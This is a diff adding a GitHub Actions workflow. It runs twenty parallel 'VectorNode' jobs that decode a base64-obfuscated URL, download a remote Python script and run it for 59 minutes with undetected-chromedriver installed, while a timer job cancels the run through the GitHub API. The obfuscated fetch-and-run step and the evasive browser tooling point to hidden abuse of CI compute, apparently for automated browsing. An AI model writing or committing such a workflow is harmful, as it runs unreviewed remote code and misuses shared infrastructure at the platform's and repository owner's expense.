@@ -1,0 +1,103 @@
+name: Aurora Cascade Warden Lattice
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: aurora-lattice-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # الحارس الزمني: يبقى مستيقظًا 59 دقيقة ثم يطلق أمر الإلغاء للـ Run
+  # =================================================================
+  aurora-warden:
+    name: "Aurora Warden"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      VIGIL_SECONDS: 3540
+    steps:
+      - name: Anchor the Vigil
+        run: |
+          echo "[WARDEN] Vigil anchored on run token: ${{ github.run_id }}"
+          echo "[WARDEN] Holding watch for ${VIGIL_SECONDS} seconds (59-minute horizon)."
+
+          sleep "${VIGIL_SECONDS}"
+
+          echo "[WARDEN] Horizon reached — dispatching termination signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WARDEN] Termination signal dispatched. All active and queued streams will be scattered."
+
+  # =================================================================
+  # شبكة العقد المتوازية: تزويد وتشغيل عُقد Vector
+  # =================================================================
+  vector-lattice:
+    name: "VectorNode-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: [2201, 2202, 2203, 2204, 2205, 2206, 2207, 2208, 2209, 2210, 2211, 2212, 2213, 2214, 2215, 2216, 2217, 2218, 2219, 2220]
+
+    steps:
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ⟴ المرحلة «1»: تجهيز طبقة الأساس
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Provision Foundation Layer
+        run: |
+          echo "[FOUNDATION] Provisioning base layer for VectorNode-${{ matrix.node_tag }} on Linux..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ⟴ المرحلة «2»: سحب حمولة Vector
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Retrieve Vector Payload
+        run: |
+          echo "[RETRIEVE] Pulling vector payload from assigned uplink..."
+          PAYLOAD_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$PAYLOAD_URL" -o vector_engine.py
+          echo "[RETRIEVE] Payload secured locally."
+
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ⟴ المرحلة «3»: تثبيت الحزم الداعمة
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Install Support Bundles
+        run: |
+          echo "[BUNDLES] Installing support bundles..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ⟴ المرحلة «4»: بثّ Vector محدود بـ 59 دقيقة
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Emit Vector Stream
+        run: |
+          echo ">> Emitting VectorNode-${{ matrix.node_tag }} stream..."
+
+          python3 vector_engine.py &
+          STREAM_PID=$!
+
+          echo ">> Stream emitted. Horizon set to 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$STREAM_PID" 2>/dev/null; then
+            echo ">> Horizon reached — shutting down stream."
+            kill -9 "$STREAM_PID"
+            echo ">> Stream terminated by horizon keeper."
+          else
+            echo ">> Stream dissolved before horizon."
+          fi
